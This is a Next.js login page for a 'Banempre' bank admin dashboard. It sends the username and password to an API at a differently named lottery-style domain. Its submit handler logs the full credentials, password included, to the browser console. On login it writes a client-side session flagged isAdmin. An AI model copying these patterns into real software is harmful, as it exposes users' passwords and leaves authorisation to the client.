"use client";

import React, { useEffect, useState, ChangeEvent, FormEvent } from "react";
import { useRouter } from "next/navigation";
import Image from "next/image";
import PulseLoader from "react-spinners/PulseLoader";

// URL de la landing de Banempre
const BANEMPRE_URL = "https://banempre.online"; // Ajustar según la URL real

export default function DashboardPage() {
  const router = useRouter();
  const [isLoading, setIsLoading] = useState(true);
  const [showLoginForm, setShowLoginForm] = useState(false);
  const [loginData, setLoginData] = useState({
    username: "",
    password: ""
  });
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [error, setError] = useState("");

  useEffect(() => {
    // Verificar si hay una sesión activa
    const session = localStorage.getItem('session');
    
    if (session) {
      // Si ya hay una sesión, redirigir directamente a ELECTORES
      setTimeout(() => {
        router.push('/');
      }, 1500);
    } else {
      // Si no hay sesión, mostrar el formulario de login
      setTimeout(() => {
        setIsLoading(false);
        setShowLoginForm(true);
      }, 1000);
    }
  }, [router]);

  const handleChange = (e: ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    console.log(`Campo ${name} actualizado a: ${value.length} caracteres`);
    
    setLoginData((prev) => {
      const updated = {
        ...prev,
        [name]: value
      };
      return updated;
    });
  };

  const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    
    console.log("Form submitted with:", loginData);
    
    if (!loginData.username || !loginData.password) {
      setError("Por favor, complete todos los campos");
      return;
    }
    
    setIsSubmitting(true);
    setError("");

    try {
      // Intentar autenticar contra la API
      const apiUrl = process.env.NEXT_PUBLIC_API_URL || 'https://applottobueno.com/api';
      const response = await fetch(`${apiUrl}/login`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(loginData),
      });
      
      if (response.ok) {
        const data = await response.json();
        
        // Guardar la sesión
        localStorage.setItem('session', JSON.stringify({
          isAdmin: true,
          lastPage: "ELECTORES",
          token: data.token
        }));
        
        // Redirigir al dashboard principal
        router.push('/');
      } else {
        setError("Credenciales incorrectas. Por favor, inténtalo nuevamente.");
      }
    } catch (error) {
      console.error('Error al iniciar sesión:', error);
      setError("Error al procesar la solicitud. Intente nuevamente.");
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleCancel = () => {
    window.location.href = BANEMPRE_URL;
  };

  // Estilo para el fondo de la página con la imagen de Banempre
  const bgStyle = {
    backgroundImage: `linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7)), url('/fondopbamempre.jpg')`,
    backgroundSize: 'cover',
    backgroundPosition: 'center',
    backgroundAttachment: 'fixed'
  };

  if (isLoading) {
    return (
      <div className="flex flex-col items-center justify-center h-screen" style={bgStyle}>
        <div className="container mx-auto px-4 py-4 flex flex-col">
          {/* Logo a la izquierda como en la landing */}
          <div className="flex justify-start mb-10">
            <Image 
              src="/logo bamempre.png" 
              alt="Banempre - Banco de los Emprendedores"
              width={500}
              height={105}
              className="w-64 md:w-auto"
              priority
            />
          </div>
          <div className="flex-grow flex justify-center items-center">
            <div className="flex flex-col items-center">
              <PulseLoader color="#ffffff" loading={true} size={12} speedMultiplier={0.75} />
              <p className="mt-4 text-white">Cargando dashboard...</p>
            </div>
          </div>
        </div>
      </div>
    );
  }

  if (showLoginForm) {
    return (
      <div className="flex flex-col min-h-screen" style={bgStyle}>
        <div className="container mx-auto px-4 py-4 md:py-6 flex flex-col min-h-screen">
          {/* Logo a la izquierda como en la landing */}
          <div className="flex justify-start mb-4 md:mb-10">
            <Image 
              src="/logo bamempre.png" 
              alt="Banempre - Banco de los Emprendedores"
              width={500}
              height={105}
              className="w-64 md:w-auto"
              priority
            />
          </div>
          
          {/* Contenido principal - formulario a la derecha */}
          <div className="flex-grow flex flex-col md:flex-row md:justify-end items-center md:items-start">
            <div className="w-full md:w-1/2 lg:w-5/12">
              <div style={{ backgroundColor: 'rgba(205, 150, 0, 0.85)' }} className="p-6 rounded-lg shadow-lg">
                <h2 className="text-xl font-bold text-center mb-6 text-white">Inicio de Sesión Admin</h2>
                
                {error && (
                  <div className="bg-red-100 text-red-600 p-3 rounded mb-4 text-sm">
                    {error}
                  </div>
                )}
                
                <form onSubmit={handleSubmit} noValidate>
                  <div className="mb-4">
                    <label className="block text-white text-sm font-medium mb-2">
                      Nombre de usuario
                    </label>
                    <input
                      type="text"
                      name="username"
                      value={loginData.username}
                      onChange={handleChange}
                      className="w-full p-3 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500"
                      required
                      autoComplete="username"
                    />
                  </div>
                  
                  <div className="mb-6">
                    <label className="block text-white text-sm font-medium mb-2">
                      Contraseña
                    </label>
                    <input
                      type="password"
                      name="password"
                      value={loginData.password}
                      onChange={(e) => {
                        const newValue = e.target.value;
                        console.log(`Contraseña actualizada: ${newValue.length} caracteres`);
                        setLoginData({
                          ...loginData,
                          password: newValue
                        });
                      }}
                      className="w-full p-3 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500"
                      required
                      autoComplete="current-password"
                    />
                  </div>
                  
                  <div className="flex flex-col space-y-3">
                    <button
                      type="submit"
                      disabled={isSubmitting}
                      className="bg-blue-600 text-white font-medium py-2 px-6 rounded-full hover:bg-blue-700 transition-colors w-full"
                    >
                      {isSubmitting ? 'Iniciando...' : 'INICIAR SESIÓN'}
                    </button>
                    
                    <button
                      type="button"
                      onClick={handleCancel}
                      className="bg-gray-600 text-white font-medium py-2 px-6 rounded-full hover:bg-gray-700 transition-colors w-full"
                    >
                      CANCELAR
                    </button>
                  </div>
                </form>
                
                <div className="mt-4 text-center text-sm">
                  <a href={BANEMPRE_URL} className="text-white hover:text-blue-100">
                    ¿No tienes una cuenta? Regístrate
                  </a>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    );
  }

  // Este contenido no debería mostrarse normalmente debido a las redirecciones
  return null;
} 